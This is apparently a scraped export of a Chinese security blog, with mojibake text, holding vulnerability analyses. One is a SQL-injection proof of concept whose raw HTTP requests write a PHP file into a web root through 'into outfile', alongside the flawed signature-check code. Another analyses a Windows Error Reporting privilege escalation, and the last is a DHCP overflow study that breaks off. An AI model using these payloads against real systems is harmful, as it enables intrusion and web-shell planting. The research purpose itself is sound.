æœ€æ–°ç‰ˆpoc\nPOST /ConsoleExternalApi.XGI?initParams=command_createUser\u0026amp;key=inner\u0026amp;sign=8b21270d796c45333f88f7db36ed9dbe HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 170 {\u0026#34;account\u0026#34;:\u0026#34;aaa\u0026#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;,\u0026#34;userPwd\u0026#34;:\u0026#34;aa\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_importUsers\u0026amp;key=inner\u0026amp;sign=ec7e8f5769c2455b773600c2912216fd HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 183 {\u0026#34;users\u0026#34;:[{\u0026#34;account\u0026#34;:\u0026#34;aaa\u0026#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;,\u0026#34;userPwd\u0026#34;:\u0026#34;bbb\u0026#34;}]} POST /ConsoleExternalApi.XGI?initParams=command_editUser__userId_usr00000010\u0026amp;key=inner\u0026amp;sign=dd1d23cb85d99349f2ab003c73df331f HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 174 {\u0026#34;userGroupId\u0026#34;:\u0026#34;aa\u0026#34;,\u0026#34;account\u0026#34;:\u0026#34;aaa\u0026#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_allocatedPointsToServer\u0026amp;key=inner\u0026amp;sign=a3efd6862f5d11319c6de783b58ff04a HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 142 {\u0026#34;serverId\u0026#34;:\u0026#34;aa\u0026#39; union select 0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;,\u0026#34;pointNUm\u0026#34;:\u0026#34;aaa\u0026#34;,\u0026#34;maximumConcurrentNUm\u0026#34;:\u0026#34;aa\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_getServerIpPort\u0026amp;key=inner\u0026amp;sign=94c4e967c00cb6da510b6a5e4e3c3fcc HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 89 {\u0026#34;iP\u0026#34;:\u0026#34;aa\u0026#39; union select 0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_publishApp\u0026amp;key=inner\u0026amp;sign=74ed1f0c20a444c561294b4939b206dc HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 100 {\u0026#34;name\u0026#34;:\u0026#34;aa\u0026#39; union select \\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;a\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_editApp__appId_APP00000002\u0026amp;key=inner\u0026amp;sign=f25574d747ffbbd51496015d25438fa9 HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 223 {\u0026#34;name\u0026#34;:\u0026#34;aa\u0026#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;} ä»£ç é€»è¾‘ï¼š\n// ä¼ å…¥å‚æ•°initParams key sign $initparams = $_REQUEST[\u0026#39;initParams\u0026#39;]; $key = $_REQUEST[\u0026#39;key\u0026#39;]; $sign = $_REQUEST[\u0026#39;sign\u0026#39;]; // ä¸¤ä¸ªä¸‹åˆ’çº¿åˆ†å‰²$initparamsï¼Œå˜æˆä¸€ä¸ªæ•°ç»„ $paramArr = explode(\u0026#34;__\u0026#34;, $initparams); // è®¾ç½®key inner if ($key == \u0026#34;wusuokey\u0026#34;) { $keyVal = $COMCASWEB-\u0026gt;getfarminfo($key); } else if ($key == \u0026#34;inner\u0026#34;) { $keyVal = \u0026#34;Realor\u0026#34;; } if (!isset($keyVal) || empty($keyVal)) { write_log(\u0026#34;{\u0026#39;å‚æ•°éæ³•\u0026#39;:\u0026#39;keyå€¼ä¸ºç©º\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;å‚æ•°éæ³•\u0026#39;); } $signCalculate = md5($initparams . $keyVal); //testLog(\u0026#34;signCalculate=\u0026#34; . $signCalculate); if ($signCalculate != $sign) { write_log(\u0026#34;{\u0026#39;å‚æ•°éæ³•\u0026#39;:\u0026#39;å‚æ•°åŠ å¯†æ–¹æ³•é”™è¯¯\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;å‚æ•°éæ³•\u0026#39;); } $requestObj = null; //testLog($paramArr); // command_createuser // éå†æ•°ç»„ï¼Œå°†æ•°ç»„çš„æ¯ä¸€é¡¹é€šè¿‡_åˆ†å‰²ï¼Œå˜æˆé”®å€¼å¯¹ foreach ($paramArr as $key =\u0026gt; $value) { $keyValue = explode(\u0026#34;_\u0026#34;, $value); $requestObj[$keyValue[0]] = $keyValue[1]; } // è·å–commandå¯¹åº”çš„å€¼ $cmd = $requestObj[\u0026#39;command\u0026#39;]; if ($cmd == \u0026#34;createUser\u0026#34;) { // ä»è¯·æ±‚ä¸­è·å–jsonæ•°æ®å¹¶decode $POST_JSON = json_decode($HTTP_RAW_POST_DATA, true); $account = $POST_JSON[\u0026#39;account\u0026#39;]; // è¿™é‡Œè¦ä¿è¯è¯·æ±‚çš„jsonæ•°æ®é‡Œé¢æœ‰account if (!isset($account) || empty($account)) { write_log(\u0026#34;{\u0026#39;createUser\u0026#39;:\u0026#39;ç”¨æˆ·è´¦æˆ·ä¸å¯ä¸ºç©º\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;ç”¨æˆ·è´¦å·ä¸å¯ä¸ºç©º\u0026#39;); } $account = utf8ToGbk($account); // è¿™é‡Œè¦ä¿è¯è¯·æ±‚çš„jsonæ•°æ®é‡Œé¢æœ‰userPwd $userPwd = $POST_JSON[\u0026#39;userPwd\u0026#39;]; if (!isset($userPwd) || empty($userPwd)) { write_log(\u0026#34;{\u0026#39;createUser\u0026#39;:\u0026#39;ç”¨æˆ·å¯†ç ä¸å¯ä¸ºç©º\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;ç”¨æˆ·å¯†ç ä¸å¯ä¸ºç©º\u0026#39;); } //è´¦å·æ˜¯å¦å·²å­˜åœ¨ è§¦å‘æ¼æ´ $result = mysql_query(\u0026#34;select * from cuser where name=\u0026#39;\u0026#34; . $account . \u0026#34;\u0026#39;\u0026#34;, $DSCon); Created at 2023-09-20T10:04:31+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/","title":"CVE-2023-36874 Windows Error Reporting Service æƒé™æå‡æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Windows error resporting serviceä¸­å­˜åœ¨æƒé™æå‡æ¼æ´ï¼Œå½“æ”»å‡»è€…å¯ä»¥åˆ›å»ºç¬¦å·é“¾æ¥åŠç›®å½•æ—¶ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´æå‡è‡³SYSTEMæƒé™ã€‚\nå½±å“ç‰ˆæœ¬ ç•¥\nç¯å¢ƒæ­å»º Windows 10 21H2 6æœˆè¡¥ä¸ æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• è¡¥ä¸å¯¹æ¯” diff wercplsupport.dllï¼Œä¸»è¦æ”¹äº†CWerComReport::SubmitReportï¼Œwercplsupport.dllæ˜¯Windows error reporting æœåŠ¡çš„ä¸»dllæ–‡ä»¶ã€‚\nå¯¹æ¯”å‘ç°è¡¥ä¸ç›´æ¥é˜»æ–­äº†åç»­CAutoImpersonate::ImpersonateUserHighestPrivså’ŒCWerComReport::_SubmitReportçš„è°ƒç”¨\n//æœªä¿®å¤ __int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v10; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; v12 = 2; if ( !CAutoImpersonate::g_bEnableImpersonate || (v10 = CAutoImpersonate::ImpersonateUserHighestPrivs((CAutoImpersonate *)\u0026amp;v12), v10 \u0026gt;= 0) ) { v10 = CWerComReport::_SubmitReport((CWerComReport *)((char *)this - 24), a2, a3, a4, a5, a6); } CAutoImpersonate::~CAutoImpersonate((CAutoImpersonate *)\u0026amp;v12); return (unsigned int)v10; } // ä¿®å¤ä»£ç  __int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v11; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; if ( (unsigned __int8)wil::details::FeatureImpl\u0026lt;__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport\u0026gt;::__private_IsEnabled(\u0026amp;`wil::Feature\u0026lt;__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport\u0026gt;::GetImpl\u0026#39;::`2\u0026#39;::impl) ) return 0x80004001i64; v12 = 2; if ( !CAutoImpersonate::g_bEnableImpersonate || (v11 = CAutoImpersonate::ImpersonateUserHighestPrivs((CAutoImpersonate *)\u0026amp;v12), v11 \u0026gt;= 0) ) { v11 = CWerComReport::_SubmitReport((CWerComReport *)((char *)this - 24), a2, a3, a4, a5, a6); } CAutoImpersonate::~CAutoImpersonate((CAutoImpersonate *)\u0026amp;v12); return (unsigned int)v11; } æ ¹æ®å‡½æ•°åCAutoImpersonate::ImpersonateUserHighestPrivså¯çŸ¥ï¼Œè¯¥å‡½æ•°ä¸ºæ¨¡æ‹Ÿç”¨æˆ·æœ€é«˜çš„æƒé™å¹¶æäº¤report\nåŠ¨æ€è°ƒè¯•\nå¼€å¯Problem Reports Control Panel SupportæœåŠ¡ï¼Œå¯¹åº”è·¯å¾„ä¸ºC:\\Windows\\System32\\svchost.exe -k netsvcs -pã€‚ ä½¿ç”¨oleviewdotnetæŸ¥è¯¢Problem Reports Control Panel SupportæœåŠ¡å¯¹åº”çš„oleä¿¡æ¯\nå¯¹åº”çš„COMæ¥å£çš„CLSIDä¸º\nCLSID: 0E9A7BB5-F699-4D66-8A47-B919F5B6A1DB AppID: 136A0DC7-DF5C-4271-A2AC-15DF1A1323F2 æŸ¥çœ‹è¿™ä¸ªCOMçš„æ¥å£ä¿¡æ¯ class __declspec(uuid(\u0026#34;6620c14b-70ae-4d4e-a4f6-91a7dcc582c2\u0026#34;)) IErcLuaSupport : public IUnknown { public: virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ IWerStoreFactory** p0); }; class __declspec(uuid(\u0026#34;4904c154-426f-4c88-8ec2-4543d18670f7\u0026#34;)) IWerStoreFactory : public IUnknown { public: virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ IWerStore** p0); virtual HRESULT __stdcall Proc4(/* Stack Offset: 8 */ IWerStore** p0); }; class __declspec(uuid(\u0026#34;1e3a0e4f-1412-444f-8a94-fc6a09cd4195\u0026#34;)) IWerStore : public IUnknown { public: virtual HRESULT __stdcall Proc3(); virtual HRESULT __stdcall Proc4(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc5(/* Stack Offset: 8 */ BSTR p0); virtual HRESULT __stdcall Proc6(/* Stack Offset: 8 */ BSTR p0, /* Stack Offset: 16 */ IWerReport** p1); virtual HRESULT __stdcall Proc7(/* Stack Offset: 8 */ BSTR p0, /* Stack Offset: 16 */ BSTR* p1); }; class __declspec(uuid(\u0026#34;d01b8f28-0bd1-4652-a415-8229f5ee506c\u0026#34;)) IWerReport : public IUnknown { public: virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc4(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc5(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc6(/* Stack Offset: 8 */ IWerKeyValueList** p0); virtual HRESULT __stdcall Proc7(/* Stack Offset: 8 */ IWerKeyValueList** p0); virtual HRESULT __stdcall Proc8(/* Stack Offset: 8 */ IWerStringList** p0); virtual HRESULT __stdcall Proc9(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc10(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc11(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc12(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc13(/* Stack Offset: 8 */ IWerStringList** p0); virtual HRESULT __stdcall Proc14(/* Stack Offset: 8 */ IWerStringList** p0); virtual HRESULT __stdcall Proc15(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc16(/* Stack Offset: 8 */ struct Struct_1* p0); virtual HRESULT __stdcall Proc17(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc18(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc19(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc20(/* Stack Offset: 8 */ BSTR p0, /* Stack Offset: 16 */ BSTR* p1); virtual HRESULT __stdcall Proc21(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc22(/* Stack Offset: 8 */ int64_t p0, /* Stack Offset: 16 */ int64_t* p1, /* Stack Offset: 24 */ int64_t* p2, /* Stack Offset: 32 */ BSTR* p3, /* Stack Offset: 40 */ BSTR* p4); virtual HRESULT __stdcall Proc23(/* Stack Offset: 8 */ int64_t p0, /* Stack Offset: 16 */ BSTR* p1); virtual HRESULT __stdcall Proc24(/* Stack Offset: 8 */ BSTR p0, /* Stack Offset: 16 */ int64_t p1, /* Stack Offset: 24 */ IWerReportSubmitCallback* p2, /* Stack Offset: 32 */ /* unique */BSTR* p3, /* Stack Offset: 40 */ /* unique */int64_t* p4); virtual HRESULT __stdcall Proc25(); }; è¿™é‡Œéœ€è¦çŸ¥é“Windowsçš„[[../../../05 Windows/COMæ¨¡å‹/COMæ¨¡å‹ OVERVIEW|COMæ¨¡å‹)ï¼ŒCOMæ¨¡å‹å®šä¹‰äº†äºŒè¿›åˆ¶æ ‡å‡†ï¼Œä»¥æ”¯æŒç»„ä»¶å¤ç”¨ã€‚å°†æ“ä½œç³»ç»ŸAPIæŠ½è±¡æˆäº†æ¥å£ï¼Œå¯ä»¥é€šè¿‡æ¥å£çš„æ ‡è¯†ç¬¦å®ä¾‹åŒ–COMå¯¹è±¡å¹¶é€šè¿‡COMå¯¹è±¡è°ƒç”¨æœåŠ¡æ¥å£ã€‚å³\nå½“ä½¿ç”¨COMæ¥å£è°ƒç”¨error reporting æœåŠ¡å¹¶æäº¤é”™è¯¯æŠ¥å‘Šæ—¶ï¼Œerror reportingä¼šå¯åŠ¨ C:\\Windows\\System32\\wermgr.exeï¼Œå¹¶ä¸”å¯åŠ¨æ—¶æƒé™ä¸º NT AUTHORITY\\SYSTEMã€‚ è¿½æº¯è°ƒç”¨æ ˆ æŸ¥çœ‹æ­¤äº‹ä»¶çš„è°ƒç”¨æ ˆï¼Œwer!WerpAuxmdMapFile+0x3887d å¤„è°ƒç”¨äº†CreateProcessW\nwer!WerpAuxmdMapFile+0x3887dä½äº UtilLaunchWerManagerå‡½æ•°å†…ï¼Œä»£ç å¦‚ä¸‹\n__int64 __fastcall UtilLaunchWerManager( const unsigned __int16 **a1, __int64 a2, __int64 a3, void *a4, void **a5, void **a6, unsigned int a7, void **a8) { .... WCHAR Buffer[264]; // [rsp+148h] [rbp+40h] BYREF v43 = -2i64; v39 = a1; v8 = a5; lpValue = a8; memset_0(Buffer, 0, 0x208ui64); lpCommandLine[0] = 0i64; lpCommandLine[1] = 0i64; ..... goto LABEL_67; } v11 = StringCchCatW(Buffer, 0x104ui64, L\u0026#34;\\\\wermgr.exe\u0026#34;); v12 = v11; if ( v11 \u0026gt;= 0 ) { v12 = CString::Sprintf((CString *)lpCommandLine, L\u0026#34;\\\u0026#34;%s\\\u0026#34; \u0026#34;, Buffer); if ( (v12 \u0026amp; 0x80000000) != 0 ) { if ( WPP_GLOBAL_Control != (HKEY)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; ((_BYTE)WPP_GLOBAL_Control[7] \u0026amp; 1) != 0 ) { WPP_SF_S(*((_QWORD *)WPP_GLOBAL_Control + 2), 20i64, \u0026amp;WPP_80b9a2815f1633611b5141c011dbf465_Traceguids, Buffer); goto LABEL_37; } goto LABEL_38; } v13 = 0; v14 = lpCommandLine[0]; while ( v13 \u0026lt; 0xE ) { ..... v19 = CString::Append((CString *)lpCommandLine, v40[0]); if ( v19 \u0026gt;= 0 || WPP_GLOBAL_Control == (HKEY)\u0026amp;WPP_GLOBAL_Control || ((_BYTE)WPP_GLOBAL_Control[7] \u0026amp; 1) == 0 ) { v14 = lpCommandLine[0]; } .... if ( UpdateProcThreadAttribute(v10, 0, 0x20002ui64, lpValue, 8i64 * a7, 0i64, 0i64) ) { StartupInfo.cb = 112; v45 = v10; if ( CreateProcessW(Buffer, v14, 0i64, 0i64, 2, 0x80000u, 0i64, 0i64, \u0026amp;StartupInfo, \u0026amp;hObject) ) { v12 = 0; } ...... } å‘ä¸Šè¿½æº¯è°ƒç”¨æ ˆï¼ŒUtilLaunchWerManagerå‡½æ•°ç”± CReportManager::ReportProblemOutOfProcessè°ƒç”¨ï¼Œ å†ä¸Šå±‚å‡½æ•°ä¸ºCReportManager::ReportProblemï¼ŒCReportManager::ReportProblemç”±ReportHandleInstance::SubmitReportè°ƒç”¨ï¼Œåœ¨ä¸Šå±‚å‡½æ•°ä¸ºWerpSubmitReportFromStoreã€‚åœ¨wecplsupport!DllCanUnloadNew+0x2bf2å¤„è°ƒç”¨äº†wer.dll!WerpSubmitReportFromStoreå‡½æ•°ã€‚\nwercplsupport!DllCanUnloadNew+0x2bf2å®é™…ä½äº wercplsupport!CWerComReport::_SubmitReportå‡½æ•°å†…ï¼Œä»£ç å¦‚ä¸‹ã€‚\n__int64 __fastcall CWerComReport::_SubmitReport( void **this, unsigned __int16 *a2, unsigned int a3, struct IUnknown *a4, unsigned __int16 **a5, unsigned int *a6) { ...... v24 = \u0026amp;CStubUI::`vftable\u0026#39;; if ( a4 ) ((void (__fastcall *)(struct IUnknown *))a4-\u0026gt;lpVtbl-\u0026gt;AddRef)(a4); v25 = a4; v23[0] = 0i64; TokenHandle = 0i64; v26 = 0; v10 = a5; if ( a5 ) { SysFreeString(*a5); *v10 = 0i64; } WerApiLock = CWerApiAutoLock::TryGetWerApiLock((CWerApiAutoLock *)v23, (struct CWerComReport *)this); if ( WerApiLock \u0026gt;= 0 ) { ..... } else { CurrentThread = GetCurrentThread(); if ( OpenThreadToken(CurrentThread, 0xF01FFu, 1, \u0026amp;TokenHandle) || GetLastError() == 1008 ) { ..... } else { WerApiLock = WerpSubmitReportFromStore( *((void **)this[5] + 4), a2, this[4], (struct IReportUI *)((unsigned __int64)\u0026amp;v24 \u0026amp; -(__int64)(a4 != 0i64)), \u0026amp;v21, a3, (enum _WER_SUBMIT_RESULT *)\u0026amp;v20); ..... } _SubmitReportç”± CWerComReport::SubmitReportè°ƒç”¨ï¼Œè€Œ CWerComReport::SubmitReportä¸ºIWerReportæ¥å£å…¬å¼€çš„å‡½æ•°ã€‚\n__int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v10; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; v12 = 2; if ( !CAutoImpersonate::g_bEnableImpersonate || (v10 = CAutoImpersonate::ImpersonateUserHighestPrivs((CAutoImpersonate *)\u0026amp;v12), v10 \u0026gt;= 0) ) { v10 = CWerComReport::_SubmitReport((CWerComReport *)((char *)this - 24), a2, a3, a4, a5, a6); } CAutoImpersonate::~CAutoImpersonate((CAutoImpersonate *)\u0026amp;v12); return (unsigned int)v10; } æ‰€ä»¥å¯ä»¥æ€»ç»“å‡ºè°ƒç”¨é“¾ï¼šwecplsupport!CWerComReport::SubmitReport-\u0026gt;wecplsupport!CWerComReport::_SubmitReport-\u0026gt;wer.dll!WerpSubmitReportFromStore...-\u0026gt;CreateProcessW\né—®é¢˜åœ¨äºåœ¨è°ƒç”¨CreateProcessWæ—¶ï¼ŒCreateProcessWä¼šä½¿ç”¨æ”»å‡»è€…è®¾ç½®çš„æ–‡ä»¶é‡å®šå‘ï¼Œä½†å°†ä½¿ç”¨è°ƒç”¨CreateProcessWçš„è¿›ç¨‹çš„security tokenè®¾ç½®è¿›ç¨‹çš„contextï¼Œè€Œä¸æ˜¯æ¨¡æ‹Ÿtokenæ¥è®¾ç½®è¿›ç¨‹çš„security contextã€‚\nä¹Ÿå°±æ˜¯æ”»å‡»è€…å¯ä»¥é€šè¿‡æ–‡ä»¶é‡å®šå‘å°† C:\\Windows\\System32é‡å®šå‘åˆ°æ”»å‡»è€…å¯æ§ç›®å½•ï¼Œå¹¶ä¸”åœ¨å¯æ§ç›®å½•å†™å…¥æ¶æ„ wermgr.exeï¼Œå½“è§¦å‘CreateProcessWæ—¶ï¼ŒCreateProcessWå°†ä½¿ç”¨æ”»å‡»è€…æ§åˆ¶çš„ç›®å½•çš„wermgr.exeæ–‡ä»¶è€Œä¸æ˜¯ç³»ç»Ÿåœ¨C:\\Windows\\System32ç›®å½•ä¸‹çš„wermgr.exeæ–‡ä»¶ã€‚å¹¶ä¸”è¯¥è¿›ç¨‹ä¸Šä¸‹æ–‡ç»§æ‰¿äº†è°ƒç”¨è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œå³ç»§æ‰¿äº†weræœåŠ¡çš„æƒé™ã€‚\nåŠ¨æ€è°ƒè¯• åœ¨ UtilLaunchWerManageræ–­ç‚¹\nbp wer!UtilLaunchWerManager è°ƒè¯•å™¨æ–­ä¸‹\n0:006\u0026gt; g Breakpoint 2 hit wer!UtilLaunchWerManager+0xf3: 00007ffb`7b11a23f e87cb3f7ff call wer!StringCchCatW (00007ffb`7b0955c0) 0:006\u0026gt; rrcx rcx=00000041e2efbce0 è¡¥ä¸åˆ†æ å‰é¢çŸ¥é“è¡¥ä¸ç›´æ¥é˜»æ–­äº†åç»­è°ƒç”¨_submitï¼Œä¹Ÿå°±æ²¡åŠæ³•å†è°ƒç”¨CreateProcessï¼Œä»è€Œé˜»æ–­äº†è°ƒç”¨é“¾ã€‚\nPoC\nhttps://github.com/Wh04m1001/CVE-2023-36874 éœ€è¦æ³¨æ„çš„æ˜¯è¿è¡Œpocéœ€è¦ä½¿ç”¨ä¸åœ¨adminç»„çš„ç”¨æˆ·ï¼Œæ–°å¢ç”¨æˆ·è¿è¡Œ\nnet user test 123456 /add å‚è€ƒé“¾æ¥\nhttps://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/\nCreated at 2023-09-19T10:26:14+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/","title":"CVE-2023-38148 Windows Ics Rceåˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ ä¾èµ–äºICSæœåŠ¡ï¼ŒInternet Connect Sharingï¼Œå¯¹åº”æ³¨å†Œè¡¨ï¼Œä¾èµ–ipnathlp.dll\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess æ¼æ´å­˜åœ¨äºå¤„ç†DHCPè¯·æ±‚æ—¶ï¼Œç”±äºæ²¡æœ‰æ£€æŸ¥è¾¹ç•Œï¼Œå¯¼è‡´åœ¨ä½¿ç”¨memsetæ—¶ä½¿ç”¨çš„é•¿åº¦å‚æ•°æ¥æºäºæ•°æ®åŒ…å†…ï¼Œå¯ä»¥å¯¼è‡´æ ˆæº¢å‡ºã€‚ æœåŠ¡è°ƒè¯•å‚è€ƒç¬¬äºŒä¸ªå‚è€ƒé“¾æ¥ã€‚\nå½±å“ç‰ˆæœ¬ ç•¥\nç¯å¢ƒæ­å»º å‚è€ƒ https://github.com/ruijanlee/h3cc/blob/master/h3cc_ruijanlee/doc/c8.md ï¼ŒåŒæ—¶åŠ ä¸€ä¸ªLinuxï¼Œç½‘å¡ä½¿ç”¨ç¬¬äºŒä¸ªç½‘å¡ï¼Œä½¿å¾—Linuxå‘å‡ºçš„DHCPåŒ…èƒ½å¤Ÿè¢«Windowsæ¥æ”¶åˆ°ã€‚\næŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• é™æ€åˆ†æ å¯¹æ¯”è¡¥ä¸ä¿®å¤å‰åçš„é€»è¾‘ï¼Œæœ‰ä¸¤ä¸ªæ˜æ˜¾çš„ä¸åŒç‚¹ï¼Œæœ‰ä¸¤ç§äº§ç”Ÿæ¼æ´çš„å¯èƒ½çš„åœ°æ–¹ã€‚\nåœ¨ä¿®å¤ç‰ˆæœ¬ä¸­åœ¨è¿›è¡Œ if ( *((_BYTE *)a2 + 230) \u0026gt; 0x20u )åˆ¤æ–­ä¹‹å‰å…ˆè°ƒç”¨äº† DumpDhcpHeaderInfoï¼Œåœ¨æ¼æ´ä»£ç ä¸­å…ˆè¿›è¡Œåˆ¤æ–­åœ¨è°ƒç”¨DumpDhcpHeaderInfo åœ¨ä¿®å¤ç‰ˆæœ¬ä¸­å¦‚æœæ»¡è¶³ if ( *((_BYTE *)a2 + 230) \u0026gt; 0x20u ) åˆ™è¿›å…¥ifå†…ï¼Œåœ¨ç»“æŸifè¯­å¥æ—¶ä¼šé€šè¿‡è·³è½¬ç•¥è¿‡ä¸€éƒ¨åˆ†å¤„ç†é€»è¾‘ï¼Œè€Œåœ¨æœªä¿®å¤ç‰ˆæœ¬å†…åˆ™è¿˜ä¼šç»§ç»­å¤„ç†ã€‚ å¯ä»¥çœ‹å‡º a2 + 230ä¸º_NH_BUFFER ç»“æ„ä½“å†…çš„æŸä¸ªé•¿åº¦å­—æ®µï¼Œè¯¥å¤„ä¸ºåˆ¤æ–­è¿™ä¸ªé•¿åº¦å­—æ®µå­˜å‚¨çš„é•¿åº¦ï¼Œè¯¥æ¼æ´åº”è¯¥æ˜¯æº¢å‡ºæ¼æ´ï¼Œå¹¶ä¸”åœ¨äº§ç”Ÿæ¼æ´çš„åœ°æ–¹éœ€è¦è¯»å–è¯¥å­—æ®µã€‚\næ‰€ä»¥æ¼æ´åº”è¯¥æ˜¯ç¬¬äºŒç‚¹æ‰€è¯´çš„ï¼Œäº§ç”Ÿåœ¨ç•¥è¿‡çš„é€»è¾‘ä¸­ã€‚\n// æœªä¿®å¤ä»£ç  void __fastcall DhcpProcessMessage(struct _DHCP_INTERFACE *a1, struct _NH_BUFFER *a2) { ...... 